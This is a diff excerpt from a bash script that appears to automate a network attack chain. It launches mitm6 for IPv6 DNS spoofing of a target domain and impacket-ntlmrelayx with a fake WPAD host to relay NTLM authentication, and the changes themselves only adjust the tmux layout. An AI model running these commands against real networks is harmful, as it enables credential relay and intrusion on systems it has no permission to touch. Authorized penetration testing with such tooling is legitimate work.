@@ -267,7 +267,7 @@ logged_command() {
 log "Creating session $session_name..."
 # The logging wrapper exits with its pipeline; no interactive shell stays open.
 mitm_command=$(logged_command "$mitm_log" mitm6 -i "$interface" -d "$target_domain")
-mitm_pane=$(tmux new-session -d -P -F '#{pane_id}' -s "$session_name" -n mitm6 "$mitm_command")
+mitm_pane=$(tmux new-session -d -P -F '#{pane_id}' -s "$session_name" -n tools "$mitm_command")
 created_session=1
 # Use the immutable session ID so a later same-name session is never targeted.
 owned_session_id=$(tmux display-message -p -t "$mitm_pane" '#{session_id}')
@@ -291,9 +291,9 @@ finish_if_expired() {
 }
 
 relay_command=$(logged_command "$relay_log" impacket-ntlmrelayx -6 -t "$relay_target" -wh "fakewpad.$target_domain" -l "$run_dir")
-relay_pane=$(tmux new-window -d -P -F '#{pane_id}' -t "$session_target" -n impacket-ntlmrelayx "$relay_command") || {
+relay_pane=$(tmux split-window -h -d -P -F '#{pane_id}' -t "$mitm_pane" "$relay_command") || {
   finish_if_expired
-  fail 'Could not create the ntlmrelayx window.'
+  fail 'Could not create the ntlmrelayx pane.'
 }
 
 check_pane() {
